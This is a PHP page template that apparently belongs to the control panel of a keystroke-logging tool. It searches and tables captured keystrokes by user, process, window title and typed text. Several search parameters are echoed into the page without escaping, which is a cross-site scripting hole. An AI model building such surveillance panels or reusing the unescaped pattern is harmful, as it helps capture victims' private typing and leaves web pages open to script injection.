<?php if (isset($data['params']['uid'])): ?>
<h2>Keyboard data of user #<?php echo $data['params']['uid']; ?></h2>
<?php else: ?>
<h2>Keyboard data:</h2>
<?php endif; ?>

<div class="content-box">
    <div class="content-title">
        <p>Search</p>
    </div>
    <div class="content-block">
        <input type="hidden" value="<?php if (isset($data['params']['uid'])) { echo $data['params']['uid']; } ?>" id="s-uid">
        <label>Process</label>
        <input onkeydown="searchKeyDown(event)" class="small" type="text" value="<?php if (isset($data['params']['proc'])) { echo $data['params']['proc']; } ?>" id="s-process">
        <label>Title</label>
        <input onkeydown="searchKeyDown(event)" class="small" type="text" value="<?php if (isset($data['params']['title'])) { echo $data['params']['title']; } ?>" id="s-title">
        <label>Text</label>
        <input onkeydown="searchKeyDown(event)" class="small" type="text" value="<?php if (isset($data['params']['q'])) { echo $data['params']['q']; } ?>" id="s-text">
        <input id="s-withtext" type="checkbox" name="s-withtext" value="1"<?php if (isset($data['params']['withtext'])) { echo ' checked="checked"'; } ?>><label for="s-withtext"><span></span>With text</label>
        <button id="search-button" onclick="doSearch('keyboardlist')">Search</button>
    </div>
</div>

<?php if ($data['state'] == 'no results'): ?>
<div style="text-align: center;">
    <h2>No results</h2>
</div>
<?php endif; ?>

<?php if ($data['state'] == 'ok'): ?>
<?php include 'paginator.php' ?>
<table class="table-data" style="width: 100%;">
    <thead>
        <tr>
        <?php if (!isset($data['params']['uid'])): ?>
            <th style="width: 5%;">UID</th>
            <th style="width: 15%;">Process</th>
        <?php else: ?>
            <th style="width: 20%;">Process</th>
        <?php endif; ?>
            <th style="width: 35%;">Title</th>
            <th style="width: 30%;">Text</th>
            <th style="width: 15%;">Event time</th>
        </tr>
    </thead>
    <tbody>
    <?php foreach ($data['items'] as $item): ?>
        <tr>
            <?php if (!isset($data['params']['uid'])): ?>
            <td><div style="text-align: center;"><a href="/user/index/?uid=<?php echo $item['user_id']; ?>">[<?php echo $item['user_id'] ?>]</a></div></td>
            <?php endif; ?>
            <td style="text-align: center;"><?php echo htmlspecialchars($item['process']) ?></td>
            <td><?php echo htmlspecialchars($item['title']) ?></td>
            <td><?php echo htmlspecialchars($item['text']) ?></td>
            <td><?php echo htmlspecialchars($item['event_time']) ?></td>
        </tr>
    <?php endforeach; ?>
    </tbody>
</table>
<?php include 'paginator.php' ?>
<?php endif; ?>